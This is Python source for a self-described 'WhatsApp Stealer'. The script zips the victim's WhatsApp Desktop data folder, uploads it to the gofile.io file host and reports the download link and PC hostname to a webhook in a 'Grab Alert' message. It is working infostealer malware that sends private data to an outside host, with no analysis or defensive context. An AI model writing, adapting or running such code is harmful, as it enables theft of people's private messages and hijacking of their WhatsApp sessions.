import os, requests, time, socket, shutil

# PSG > OM

WEBHOOK = "xpierroz on top"

temp = "C:\Temp"
direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"

def upload(path):
    for x in range(10):
        try:
            rr = requests.post(
                f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
                files={
                    "file": open(path, "rb")
                },
            ).json()["data"]["downloadPage"]
            return rr
        except Exception:
            time.sleep(2)
    return False

def l_om_est_eclate():
    try:
        shutil.make_archive(os.path.join(temp, "ssouput"), "zip", direct)
    except Exception:
        pass
    
    m = upload(f"{temp}\\ssouput.zip")
    os.remove(f"{temp}\\ssouput.zip")
    
    embed = {
        "title": "🔔 Grab Alert",
        "description": f"**XPierroz WhatsApp Stealer Report**\n\n🖥️ Pc Name: {socket.gethostname()}\n📎 Url: {m}",
        "color": 0x008000
    }
    
    payload = {
        "content": "@everyone",
        "username": "XPierroz WhatsApp Stealer",
        "avatar_url": "https://github.com/xpierroz/WhatsappStealer/blob/master/assets/whatsapp.png?raw=true",
        "embeds": [embed]
    }

    headers = {
        "Content-Type": "application/json"
    }
    
    requests.post(WEBHOOK, json=payload, headers=headers)

l_om_est_eclate()
